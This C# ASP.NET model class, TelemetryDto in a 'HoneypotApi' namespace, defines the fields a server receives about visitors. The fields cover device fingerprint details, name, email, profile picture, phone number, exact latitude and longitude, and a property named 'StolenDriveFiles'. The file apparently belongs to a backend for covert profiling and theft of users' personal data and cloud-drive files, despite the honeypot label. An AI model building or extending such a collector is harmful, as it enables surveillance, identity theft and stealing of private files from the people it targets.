using Microsoft.AspNetCore.Mvc;

namespace HoneypotApi.Models
{
    public class TelemetryDto
    {
        public int? ScreenWidth { get; set; }
        public int? ScreenHeight { get; set; }
        public int? CpuCores { get; set; }
        public int? RamGb { get; set; }
        public decimal? BatteryLevelPct { get; set; }
        public string LanguageInfo { get; set; }
        public string TimeZoneInfo { get; set; }
        public string UserAgentData { get; set; }

        public string IdentityName { get; set; }
        public string IdentityEmail { get; set; }
        public string IdentityPictureUrl { get; set; }
        
        public string StolenDriveFiles { get; set; } // Propiedad nueva
        
        public decimal? Latitude { get; set; }
        public decimal? Longitude { get; set; }

        public string? IspName { get; set; }
        public string? GpuModel { get; set; }
        public string? ConnectionType { get; set; }
        public string? PhoneNumber { get; set; }
    }
}